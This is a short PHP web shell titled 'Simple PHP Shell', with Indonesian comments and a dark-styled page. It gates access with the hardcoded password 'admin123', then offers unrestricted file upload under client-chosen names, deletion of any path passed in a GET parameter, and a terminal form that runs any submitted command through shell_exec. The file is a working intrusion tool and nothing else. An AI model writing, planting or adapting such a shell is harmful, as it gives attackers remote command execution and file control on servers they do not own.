<?php
session_start();

// Konfigurasi password untuk login
$password = "admin123"; // Ganti dengan password yang lebih kuat

// Cek apakah sudah login
if (!isset($_SESSION['auth'])) {
    // Menampilkan form login jika belum login
    if (isset($_POST['password']) && $_POST['password'] === $password) {
        $_SESSION['auth'] = true;
        header("Location: " . $_SERVER['PHP_SELF']); // Arahkan setelah login sukses
        exit;
    } else {
        echo '<form method="POST"><input type="password" name="password" placeholder="Masukkan Password" required><input type="submit" value="Login"></form>';
        exit;
    }
}

// Fungsi Upload File
if (isset($_FILES['file'])) {
    move_uploaded_file($_FILES['file']['tmp_name'], $_FILES['file']['name']);
    echo "<script>alert('File uploaded!');</script>";
}

// Fungsi Hapus File
if (isset($_GET['delete'])) {
    if (file_exists($_GET['delete'])) {
        unlink($_GET['delete']);
        echo "<script>alert('File deleted!');</script>";
    } else {
        echo "<script>alert('File not found!');</script>";
    }
}

// Fungsi Eksekusi Perintah Shell
$output = "";
if (isset($_POST['cmd'])) {
    $output = shell_exec($_POST['cmd'] . " 2>&1");
}
?>

<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Simple PHP Shell</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #222;
            color: #fff;
            text-align: center;
            padding: 20px;
        }
        form {
            margin: 10px auto;
            max-width: 400px;
            padding: 15px;
            background: #333;
            border-radius: 8px;
        }
        input, button {
            width: 80%;
            padding: 8px;
            margin: 5px;
            background: #444;
            color: #fff;
            border: 1px solid #555;
            border-radius: 5px;
        }
        input[type="submit"], button {
            background: #28a745;
            cursor: pointer;
        }
        pre {
            background: #111;
            padding: 10px;
            border-radius: 5px;
            text-align: left;
            overflow-x: auto;
            max-width: 80%;
            margin: auto;
            min-height: 100px;
            white-space: pre-wrap;
            word-wrap: break-word;
        }
    </style>
</head>
<body>

    <h2>Simple PHP Shell</h2>

    <!-- Form Upload -->
    <form method="POST" enctype="multipart/form-data">
        <h3>Upload File</h3>
        <input type="file" name="file">
        <input type="submit" value="Upload">
    </form>

    <!-- Form Delete File -->
    <form method="GET">
        <h3>Hapus File</h3>
        <input type="text" name="delete" placeholder="Nama file">
        <input type="submit" value="Delete">
    </form>

    <!-- Terminal -->
    <form method="POST">
        <h3>Terminal Console</h3>
        <input type="text" name="cmd" placeholder="Masukkan Perintah">
        <button type="submit">Run</button>
    </form>

    <!-- Kotak Output Terminal -->
    <pre><?php echo htmlspecialchars($output); ?></pre>

</body>
</html>